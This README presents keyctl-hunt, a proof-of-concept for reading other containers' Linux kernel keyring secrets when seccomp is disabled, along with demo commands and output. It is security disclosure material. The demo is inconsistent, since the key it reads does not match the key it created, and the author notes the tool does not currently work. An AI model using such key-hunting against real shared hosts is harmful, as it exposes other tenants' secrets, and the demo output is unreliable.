# Keyctl-hunt

the `keyctl()` syscall allows a user to interact with Linux kernel keyrings 
which store sensitive information per user, session, threat, or process. These
keyrings are used by many different applications and are visible in 
`/proc/keys`. 

For containers, this was deemed a security risk you don't want your containers
to be able to see your hosts keys but but the fix for this was to simply 
"mask" `/proc/keys` so that `cat /proc/keys` would return no results. 

This mask is a lie. 

In reality, the mask truly just obfuscates the keys and there's nothing 
preventing one container from finding the keys of another container, and even
worse, keys of the host. 

# Demo

In one container, create a new key:

~~~
docker run -it --security-opt seccomp=unconfined keyctl /bin/bash \
> keyctl add user myprivatekey the-secret-is-yes @s
123456789
~~~

Run a container (with seccomp disabled like Kubernetes) and guess they keys:

~~~
docker run -it --security-opt seccomp=unconfined keyctl /bin/bash \
> keyctl_hunter -key 123456790
640540911
user;0;0;3f010000;mykey
CONTENTS OF KEY:
String:	 thisisatest
Bytes:	[1110100 1101000 1101001 1110011 1101001 1110011 1100001 1110100 1100101 1110011 1110100]
~~~

NOTE: This doesn't work right now and only exposes keys between containers, not
from the host unless the host has some silly keys exposed. 